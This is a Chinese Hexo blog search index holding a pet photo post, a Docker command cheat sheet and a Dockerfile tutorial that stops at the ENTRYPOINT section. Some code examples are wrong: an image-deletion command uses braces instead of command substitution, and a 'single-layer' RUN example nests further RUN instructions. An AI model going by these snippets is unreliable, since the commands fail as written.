<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>jiojio</title>
    <url>/posts/c3b89d27.html</url>
    <content><![CDATA[<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815172909.jpg" alt="img"></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815172639.jpg" alt="img"></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815172655.jpg" alt="img"></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815172701.jpg" alt="img"></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815172836.jpg" alt="img"></p>
]]></content>
      <categories>
        <category>生活点滴</category>
      </categories>
      <tags>
        <tag>jiojio</tag>
        <tag>宠物</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker-常用命令</title>
    <url>/posts/b6c3d8dd.html</url>
    <content><![CDATA[<h1 id="一、docker基础命令"><a href="#一、docker基础命令" class="headerlink" title="一、docker基础命令"></a>一、docker基础命令</h1><h2 id="1-启动与关闭docker"><a href="#1-启动与关闭docker" class="headerlink" title="1. 启动与关闭docker"></a>1. 启动与关闭docker</h2><p><strong>启动docker</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
<p><strong>关闭docker</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure>
<p><strong>重启docker</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
<p><strong>设置docker随服务启动而自启动</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure>

<h2 id="2-查看docker信息"><a href="#2-查看docker信息" class="headerlink" title="2. 查看docker信息"></a>2. 查看docker信息</h2><p><strong>查看docker运行状态</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status docker</span><br></pre></td></tr></table></figure>

<p><strong>查看docker版本号信息</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker version</span><br><span class="line"></span><br><span class="line">docker info</span><br></pre></td></tr></table></figure>

<h2 id="3-docker帮助命令"><a href="#3-docker帮助命令" class="headerlink" title="3. docker帮助命令"></a>3. docker帮助命令</h2><p><strong>docker帮助命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker --<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">一般都如下使用</span><br><span class="line">docker xx --<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line">docker save --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="二、docker镜像命令"><a href="#二、docker镜像命令" class="headerlink" title="二、docker镜像命令"></a>二、docker镜像命令</h1><ul>
<li>镜像名称一般分两部分组成：【repository】:【tag】</li>
<li>在没有指定tag时，默认是latest，代表最新版本的镜像</li>
</ul>
<h2 id="1-查询与搜索镜像"><a href="#1-查询与搜索镜像" class="headerlink" title="1. 查询与搜索镜像"></a>1. 查询与搜索镜像</h2><p><strong>查看服务器中docker镜像列表</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line"><span class="comment"># 查看所有镜像的id</span></span><br><span class="line">docker images -q</span><br></pre></td></tr></table></figure>
<p><strong>搜索镜像</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search 镜像名</span><br></pre></td></tr></table></figure>

<blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133441.png" alt=" "></p>
<hr>
<ul>
<li><p>**<code>NAME</code>**：镜像仓库源的名称</p>
</li>
<li><p>**<code>DESCRIPTION</code>**： 镜像的描述</p>
</li>
<li><p>**<code>OFFICIAL</code>**：是否 docker 官方发布</p>
</li>
<li><p>**<code>stars</code>**：类似 Github 里面的 star，表示点赞、喜欢的意思。</p>
</li>
<li><p>**<code>AUTOMATED</code>**：自动构建。</p>
</li>
</ul>
</blockquote>
<h2 id="2-拉取镜像"><a href="#2-拉取镜像" class="headerlink" title="2. 拉取镜像"></a>2. 拉取镜像</h2><p><strong>拉取镜像</strong>  不加tag（版本号）即默认拉取doche仓库中该镜像的最新版本latest</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull 镜像名</span><br><span class="line">docker pull 镜像名:tag</span><br></pre></td></tr></table></figure>
<p>镜像版本号可到docker hub中查看</p>
<p><a href="https://hub.docker.com/search">docker官方镜像</a></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133447.png" alt=" "></p>
<h2 id="3-删除镜像"><a href="#3-删除镜像" class="headerlink" title="3. 删除镜像"></a>3. 删除镜像</h2><p><strong>删除镜像</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除一个</span></span><br><span class="line">docker rmi -f 镜像名/镜像ID</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除多个</span></span><br><span class="line">docker rmi -f 镜像名/镜像ID 镜像名/镜像ID 镜像名/镜像ID...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除全部镜像 -a：显示全部  -q:只显示id</span></span><br><span class="line">docker rmi -f <span class="variable">$&#123;docker images -aq&#125;</span></span><br></pre></td></tr></table></figure>


<h2 id="4-保存与加载镜像"><a href="#4-保存与加载镜像" class="headerlink" title="4. 保存与加载镜像"></a>4. 保存与加载镜像</h2><p><strong>保存镜像</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker save [OPTIONS] 镜像 [镜像...]</span><br><span class="line"></span><br><span class="line">OPTIONS 说明：</span><br><span class="line">	-o: 输出到的文件。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用格式</span></span><br><span class="line">docker save -o 压缩文件名称 镜像名称:版本号</span><br><span class="line">例如</span><br><span class="line">docker save -o nginx.tar nginx:latest</span><br></pre></td></tr></table></figure>

<p><strong>加载镜像</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker load [OPTIONS] 保存的目标文件名称</span><br><span class="line"></span><br><span class="line">OPTIONS 说明：</span><br><span class="line">	--input, -i: 指定导入的文件，代替 STDIN。</span><br><span class="line">	--quiet, -q:精简输出信息。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用格式</span></span><br><span class="line">docker load –i 压缩文件名称</span><br><span class="line">例如</span><br><span class="line">docker load -i nginx.tar</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="三、docker容器命令"><a href="#三、docker容器命令" class="headerlink" title="三、docker容器命令"></a>三、docker容器命令</h1><h2 id="1-查看容器运行及状态"><a href="#1-查看容器运行及状态" class="headerlink" title="1. 查看容器运行及状态"></a>1. 查看容器运行及状态</h2><p><strong>查看正在运行的容器及状态</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看正在运行的容器</span></span><br><span class="line">docker ps </span><br><span class="line"><span class="comment"># 查看所有容器，包括已经停止的</span></span><br><span class="line">docker ps -a  </span><br><span class="line"><span class="comment"># 查看容器信息</span></span><br><span class="line">docker inspect 容器名称/容器ID</span><br></pre></td></tr></table></figure>

<h2 id="2-创建并运行容器"><a href="#2-创建并运行容器" class="headerlink" title="2. 创建并运行容器"></a>2. 创建并运行容器</h2><p><strong>创建并运行容器</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run [可选参数] 镜像[:tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用参数说明</span></span><br><span class="line">-i：保持容器运行。通常与 -t 同时使用。加入it这两个参数后，容器创建后自动进入容器中，退出容器后，容器自动关闭。</span><br><span class="line">-t：为容器重新分配一个伪输入终端，通常与 -i 同时使用。</span><br><span class="line">-d：以守护（后台）模式运行容器。创建一个容器在后台运行，需要使用 docker <span class="built_in">exec</span> 进入容器。退出后，容器不会关闭。</span><br><span class="line">-it：创建的容器一般称为交互式容器，使用交互方式运行。</span><br><span class="line">-<span class="built_in">id</span>： 创建的容器一般称为守护式容器。</span><br><span class="line">-P: 随机端口映射，容器内部端口随机映射到主机的端口</span><br><span class="line">-p: 指定端口映射，-p 8080:8080</span><br><span class="line">	-p ip:主机端口:容器端口</span><br><span class="line">	-p 主机端口:容器端口  （常用）</span><br><span class="line">	-p 容器端口</span><br><span class="line">--name：为创建的容器命名。</span><br><span class="line">-e: 例如 -e username=<span class="string">&quot;tyt&quot;</span>, 设置环境变量。</span><br><span class="line">--volume, -v: 绑定一个卷。</span><br><span class="line">-m: 设置容器使用内存最大值。</span><br></pre></td></tr></table></figure>

<h2 id="3-进入容器"><a href="#3-进入容器" class="headerlink" title="3. 进入容器"></a>3. 进入容器</h2><p><strong>进入容器</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> 参数 <span class="comment"># 退出容器，容器不会关闭</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用</span></span><br><span class="line">docker <span class="built_in">exec</span> -it 容器<span class="built_in">id</span> /bin/bash</span><br></pre></td></tr></table></figure>
<h2 id="4-启动与停止容器"><a href="#4-启动与停止容器" class="headerlink" title="4. 启动与停止容器"></a>4. 启动与停止容器</h2><p> <strong>启动与停止容器</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start 容器<span class="built_in">id</span>           <span class="comment"># 启动容器</span></span><br><span class="line">docker restart 容器<span class="built_in">id</span>         <span class="comment"># 重启容器</span></span><br><span class="line">docker unpause 容器<span class="built_in">id</span>          <span class="comment"># 让一个容器从暂停状态恢复运行</span></span><br><span class="line">docker pause 容器<span class="built_in">id</span>           <span class="comment"># 暂停容器</span></span><br><span class="line">docker stop 容器<span class="built_in">id</span>            <span class="comment"># 停止当前正在运行的容器</span></span><br><span class="line">docker <span class="built_in">kill</span> 容器<span class="built_in">id</span>            <span class="comment"># 强制停止当前的容器</span></span><br></pre></td></tr></table></figure>

<h2 id="5-删除容器"><a href="#5-删除容器" class="headerlink" title="5. 删除容器"></a>5. 删除容器</h2><p><strong>删除容器：如果容器是运行状态则删除失败，需要停止容器才能删除</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除指定容器, 不能删除正在运行的容器，如果需要强制删除 rm -f</span></span><br><span class="line">docker <span class="built_in">rm</span> 容器名称/容器ID     </span><br><span class="line"><span class="comment"># 删除指定容器并删除数据卷</span></span><br><span class="line">docker <span class="built_in">rm</span> -v 容器名称/容器ID     </span><br><span class="line"><span class="comment"># 删除所有容器               </span></span><br><span class="line">docker <span class="built_in">rm</span> -f $(docker ps -aq)       </span><br><span class="line"><span class="comment"># 删除所有的容器</span></span><br><span class="line">docker ps -a -q|xargs docker <span class="built_in">rm</span> -f  </span><br></pre></td></tr></table></figure>


<hr>
<h1 id="四、docker其他常用命令"><a href="#四、docker其他常用命令" class="headerlink" title="四、docker其他常用命令"></a>四、docker其他常用命令</h1><p><strong>查看日志</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker logs -tf --<span class="built_in">tail</span> 信息条数 容器<span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p><strong>查看容器中进程信息</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker top 容器<span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p><strong>从容器中拷贝文件到主机</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> 容器<span class="built_in">id</span>:容器内路径 主机目的路径</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝是一个手动过程，一般会使用数据卷来实现宿主机与容器的数据自动同步</span></span><br></pre></td></tr></table></figure>

<p><strong>查看镜像的元数据</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker inspect 容器<span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p><strong>commit镜像</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit -m=<span class="string">&quot;提交的描述信息&quot;</span> -a=<span class="string">&quot;作者&quot;</span> 容器<span class="built_in">id</span> 目标镜像名：[TAG]</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="五、docker数据卷命令"><a href="#五、docker数据卷命令" class="headerlink" title="五、docker数据卷命令"></a>五、docker数据卷命令</h1><h2 id="1-数据卷基本操作"><a href="#1-数据卷基本操作" class="headerlink" title="1. 数据卷基本操作"></a>1. 数据卷基本操作</h2><p><strong>创建数据卷</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker volume create 数据卷名</span><br></pre></td></tr></table></figure>

<p><strong>查看所有数据卷</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker volume <span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><strong>查看指定数据卷详细信息</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 显示一个或多个volume的信息</span></span><br><span class="line">docker volume inspect 数据卷名</span><br></pre></td></tr></table></figure>

<p><strong>删除数据卷</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除一个或多个指定的 volume</span></span><br><span class="line">docker volume <span class="built_in">rm</span> 数据卷</span><br></pre></td></tr></table></figure>

<p><strong>清除无主的数据卷</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除未使用的volume</span></span><br><span class="line">docker volume prune </span><br></pre></td></tr></table></figure>


<h2 id="2-挂载数据卷"><a href="#2-挂载数据卷" class="headerlink" title="2. 挂载数据卷"></a>2. 挂载数据卷</h2><p><strong>创建启动容器时，使用 <code>-v</code> 参数 设置数据卷</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run ... -v 宿主机目录(文件):容器内目录(文件) ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如何确定是具名挂载还是匿名挂载，还是指定路径挂载！</span></span><br><span class="line">-v 容器内路径                  <span class="comment"># 匿名挂载</span></span><br><span class="line">-v 卷名:容器内路径              <span class="comment"># 具名挂载</span></span><br><span class="line">-v /主机路径:容器内路径          <span class="comment"># 指定路径挂载</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>注意事项</strong>：</p>
<ul>
<li>目录必须是绝对路径</li>
<li>如果目录不存在，会自动创建</li>
<li>一个容器可以挂载多个数据卷</li>
</ul>
</blockquote>
<p><strong>例</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it --name mysql \</span><br><span class="line">	-v /root/data:/root/data_container \</span><br><span class="line">	centos:7 /bin/bash</span><br></pre></td></tr></table></figure>



<h2 id="4-数据卷权限控制"><a href="#4-数据卷权限控制" class="headerlink" title="4. 数据卷权限控制"></a>4. 数据卷权限控制</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过 -v 容器内容路径 ro rw 改变读写权限</span></span><br><span class="line">ro  <span class="built_in">readonly</span>    <span class="comment"># 只读</span></span><br><span class="line">rw  readwrite   <span class="comment"># 可读可写</span></span><br><span class="line"> </span><br><span class="line">docker run -d -P --name nginx02 -v /nginx:/etc/nginx:ro nginx</span><br><span class="line">docker run -d -P --name nginx02 -v /nginx:/etc/nginx:rw nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># ro 只要看到ro就说明这个路径只能通过宿主机来操作，容器内容无法操作</span></span><br></pre></td></tr></table></figure>

<h2 id="5-数据卷容器的配置"><a href="#5-数据卷容器的配置" class="headerlink" title="5. 数据卷容器的配置"></a>5. 数据卷容器的配置</h2><ul>
<li><strong>创建启动c3数据卷容器，使用 <code>-v</code> 参数设置数据卷</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run –it --name=c3 -v /volume centos:7 /bin/bash</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>创建启动 c1、c2 容器，使用 <code>--volumes-from</code> 参数设置数据卷</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run –it --name=c1 --volumes-from c3 centos:7 /bin/bash</span><br><span class="line">docker run –it --name=c2 --volumes-from c3 centos:7 /bin/bash</span><br></pre></td></tr></table></figure>




<hr>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>容器</tag>
        <tag>运维</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker-Dockerfile</title>
    <url>/posts/e3a7e431.html</url>
    <content><![CDATA[<h1 id="一、引入"><a href="#一、引入" class="headerlink" title="一、引入"></a>一、引入</h1><h2 id="1-什么是Dockerfile"><a href="#1-什么是Dockerfile" class="headerlink" title="1. 什么是Dockerfile"></a>1. 什么是Dockerfile</h2><p>Dockerfile 是一个用来<strong>构建镜像的文本文件</strong>，包含了一条条构建镜像所需的指令和说明。</p>
<blockquote>
<ul>
<li>Dockerfile 是一个文本文件</li>
<li>包含了一条条的指令</li>
<li>每一条指令构建一层，基于基础镜像，最终构建出一个新的镜像</li>
<li>对于开发人员：可以为开发团队提供一个完全一致的开发环境</li>
<li>对于测试人员：可以直接拿开发时所构建的镜像或者通过Dockerfile文件 构建一个新的镜像开始工作了</li>
<li>对于运维人员：在部署时，可以实现应用的无缝移植</li>
</ul>
</blockquote>
<p>常见的镜像在<a href="https://hub.docker.com/">DockerHub</a>就能找到，但是我们自己写的项目就必须自己构建镜像了。<br>dockerFile是用来构建docker镜像的文件！命令参数脚本！</p>
<p>构建自定义的镜像时，并不需要一个个文件去拷贝，打包。</p>
<p>我们只需要告诉Docker，我们的镜像的组成，需要哪些BaseImage、需要拷贝什么文件、需要安装什么依赖、启动脚本是什么，将来Docker会帮助我们构建镜像。</p>
<p>而要自定义镜像，就必须先了解镜像的结构才行。</p>
<h2 id="2-镜像结构"><a href="#2-镜像结构" class="headerlink" title="2. 镜像结构"></a>2. 镜像结构</h2><p>镜像是将应用程序及其需要的系统函数库、环境、配置、依赖打包而成。</p>
<p>我们以MySQL为例，来看看镜像的组成结构：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133026.png" alt="  "></p>
<p>简单来说，镜像就是在系统函数库、运行环境基础上，添加应用程序文件、配置文件、依赖文件等组合，然后编写好启动脚本打包在一起形成的文件。</p>
<p>我们要构建镜像，其实就是实现上述打包的过程。</p>
<h2 id="3-约定"><a href="#3-约定" class="headerlink" title="3. 约定"></a>3. 约定</h2><ul>
<li>Dockerfile中所用的所有文件一定要和Dockerfile文件在<strong>同一级父目录</strong>下，可以为Dockerfile父目录的子目录</li>
<li>Dockerfile中相对路径默认都是Dockerfile所在的目录</li>
<li>Dockerfile中一定要惜字如金，能写到一行的指令，一定要写到一行，原因是分层构建，联合挂载这个特性。Dockerfile中每一条指令被视为一层</li>
</ul>
<hr>
<h1 id="二、Dockerfile常用指令"><a href="#二、Dockerfile常用指令" class="headerlink" title="二、Dockerfile常用指令"></a>二、Dockerfile常用指令</h1><p><strong>Dockerfile</strong>就是一个文本文件，其中包含一个个的**指令(Instruction)**，用指令来说明要执行什么操作来构建镜像。每一个指令都会形成一层Layer。</p>
<p>网上找到一张很有意思的图，我将它放在这。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133032.png" alt="  "></p>
<hr>
<h2 id="1-FROM"><a href="#1-FROM" class="headerlink" title="1. FROM"></a>1. FROM</h2><p>基础镜像，定制的镜像都是基于 <code>FROM</code> 的镜像。并且<strong>必须是第一条指令</strong>。</p>
<p>如果不以任何镜像为基础，那么写法为：<code>FROM scratch</code>。</p>
<ul>
<li><strong>格式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM &lt;image&gt;</span><br><span class="line">FROM &lt;image&gt;:&lt;tag&gt;</span><br><span class="line">FROM &lt;image&gt;@&lt;digest&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：</span></span><br><span class="line">tag或digest是可选的，如果不使用这两个值时，会使用latest版本的基础镜像</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>例子</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM mysql:5.7</span><br><span class="line"><span class="comment"># 若不以任何镜像为基础</span></span><br><span class="line">FROM scratch</span><br></pre></td></tr></table></figure>





<h2 id="2-MAINTAINER"><a href="#2-MAINTAINER" class="headerlink" title="2. MAINTAINER"></a>2. MAINTAINER</h2><p>镜像是谁写的， 姓名+邮箱。可以只写一个。</p>
<p><strong>新版Docker中将弃用，并使用<code>LABEL</code>指明</strong>。</p>
<ul>
<li><strong>格式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MAINTAINER &lt;name&gt;</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>例子</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只写名字</span></span><br><span class="line">MAINTAINER tyt</span><br><span class="line"><span class="comment"># 只写邮箱</span></span><br><span class="line">MAINTAINER 273@qq.com</span><br><span class="line"><span class="comment"># 名字 + 邮箱</span></span><br><span class="line">MAINTAINER tyt&lt;273@qq.com&gt;</span><br></pre></td></tr></table></figure>


<h2 id="3-LABEL"><a href="#3-LABEL" class="headerlink" title="3. LABEL"></a>3. LABEL</h2><p><code>LABEL</code> 指令用来给镜像添加一些元数据（metadata），以键值对的形式。通俗点说就是为镜像指定标签。</p>
<ul>
<li><strong>格式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>例子</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LABEL org.opencontainers.image.authors=<span class="string">&quot;tyt&quot;</span> version=<span class="string">&quot;1.0&quot;</span> label1=<span class="string">&quot;l1&quot;</span> </span><br></pre></td></tr></table></figure>




<h2 id="4-RUN"><a href="#4-RUN" class="headerlink" title="4. RUN"></a>4. RUN</h2><p> <strong>镜像构建</strong>的时候需要运行的命令。有以下2种格式：</p>
<ul>
<li><strong>shell 格式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RUN &lt;命令行命令&gt;</span><br><span class="line"><span class="comment"># &lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>exec格式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RUN [<span class="string">&quot;可执行文件或命令&quot;</span>, <span class="string">&quot;参数1&quot;</span>, <span class="string">&quot;参数2&quot;</span>, ...]</span><br><span class="line"><span class="comment"># RUN [&quot;./test.php&quot;, &quot;dev&quot;, &quot;offline&quot;] 等价于 RUN ./test.php dev offline</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>例子</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RUN yum -y install vim</span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line">RUN [<span class="string">&quot;/etc/execfile&quot;</span>, <span class="string">&quot;arg1&quot;</span>, <span class="string">&quot;arg1&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以上执行会创建 3 层镜像。可简化为以下格式：</span></span><br><span class="line"></span><br><span class="line">RUN yum -y install vim \</span><br><span class="line">	&amp;&amp; RUN yum -y install net-tools \</span><br><span class="line">	&amp;&amp; RUN [<span class="string">&quot;/etc/execfile&quot;</span>, <span class="string">&quot;arg1&quot;</span>, <span class="string">&quot;arg1&quot;</span>]</span><br><span class="line">	</span><br><span class="line"><span class="comment"># 如上，以 &amp;&amp; 符号连接命令，这样执行后，只会创建 1 层镜像。</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意</strong><br><code>RUN</code>指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，可以在构建时指定<code>--no-cache</code>参数，如：<code>docker build --no-cache</code></p>
</blockquote>
<h2 id="5-CMD"><a href="#5-CMD" class="headerlink" title="5.  CMD"></a>5.  CMD</h2><p>类似于 <code>RUN</code> 指令，用于运行程序，但二者运行的时间点不同:</p>
<blockquote>
<ul>
<li><code>CMD</code> 在<code>docker run</code> 时运行。</li>
<li><code>RUN</code> 在<code>docker build</code>时运行。</li>
</ul>
</blockquote>
<blockquote>
<p><strong>作用</strong></p>
<ul>
<li>为启动的容器指定默认要运行的程序，程序运行结束，容器也就结束。</li>
<li><code>CMD</code> 指令指定的程序可被 <code>docker run</code> 命令行参数中指定要运行的程序所覆盖。</li>
</ul>
<p><strong>注意</strong></p>
<ul>
<li>如果 Dockerfile 中如果存在多个 <code>CMD</code> 指令，仅<strong>最后一个生效</strong>。</li>
</ul>
</blockquote>
<ul>
<li><strong>格式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 格式1：执行可执行文件或命令</span></span><br><span class="line">CMD [<span class="string">&quot;&lt;可执行文件或命令&gt;&quot;</span>,<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...] </span><br><span class="line"><span class="comment"># 格式2：执行 shell 内部命令</span></span><br><span class="line">CMD &lt;shell命令&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式3：该写法是为 ENTRYPOINT 指令指定的程序提供默认参数</span></span><br><span class="line"><span class="comment"># 注意，待会下面会提到</span></span><br><span class="line">CMD [<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...]  </span><br><span class="line"></span><br><span class="line">推荐使用第一种格式，执行过程比较明确。</span><br><span class="line">第二种格式实际上在运行的过程中也会自动转换成第一种格式运行，</span><br><span class="line">并且默认可执行文件是 sh, 即 /bin/bash</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line">CMD <span class="built_in">ls</span> -a </span><br><span class="line">会转换为</span><br><span class="line">CMD [<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-a&quot;</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>例子</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 执行可执行文件或命令</span></span><br><span class="line">CMD [<span class="string">&quot;/usr/bin/wc&quot;</span>,<span class="string">&quot;--help&quot;</span>]</span><br><span class="line"><span class="comment"># 执行 shell 内部命令</span></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="string">&quot;This is a test.&quot;</span> | <span class="built_in">wc</span> -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为 ENTRYPOINT 指令指定的程序提供默认参数</span></span><br><span class="line">ENTRYPOINT [<span class="string">&quot;nginx&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">CMD [<span class="string">&quot;/etc/nginx/nginx.conf&quot;</span>]</span><br><span class="line"></span><br><span class="line">默认执行时，运行以下命令</span><br><span class="line">nginx -c /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>


<h2 id="6-ENTRYPOINT"><a href="#6-ENTRYPOINT" class="headerlink" title="6. ENTRYPOINT"></a>6. ENTRYPOINT</h2><p>类似于 <code>CMD</code> 指令，<strong>运行时机相同，都是在<code>docker run</code>执行</strong>，但其不会被 <code>docker run</code> 的命令行参数指定的指令所覆盖，而且这些命令行参数会被当作参数追加到 <code>ENTRYPOINT</code> 指令指定的程序。（具体谁被覆盖、谁被追加可看下方<strong>镜像构建实战</strong>中的 <strong>验证CMD 和ENTRYPOINT区别</strong>）。</p>
<blockquote>
<p><strong>CMD与ENTRYPOINT不同点</strong></p>
<ul>
<li><code>ENTRYPOINT</code>不会被运行的command覆盖，而<code>CMD</code>则会被覆盖。但是, 如果运行 <code>docker run</code> 时使用了 <code>--entrypoint</code> 选项，将覆盖 <code>ENTRYPOINT</code> 指令指定的程序。</li>
</ul>
<p><strong>ENTRYPOINT优点</strong></p>
<ul>
<li>在执行 <code>docker run</code> 的时候可以指定 <code>ENTRYPOINT</code> 运行所需的参数。</li>
</ul>
<p><strong>注意</strong></p>
<ul>
<li>如果 Dockerfile 中如果存在多个 <code>ENTRYPOINT</code> 指令，仅最后一个生效。</li>
<li>如果我们在Dockerfile种同时写了<code>ENTRYPOINT</code>和<code>CMD</code>，并且<code>CMD</code>指令<strong>不是一个完整的可执行命令</strong>，那么<code>CMD</code>指定的内容将会作为<code>ENTRYPOINT</code>的参数</li>
<li>如果我们在Dockerfile种同时写了<code>ENTRYPOINT</code>和<code>CMD</code>，并且<code>CMD</code><strong>是一个完整的指令</strong>，那么它们两个会互相覆盖，谁在最后谁生效</li>
</ul>
</blockquote>
<ul>
<li><strong>格式</strong></li>
</ul>
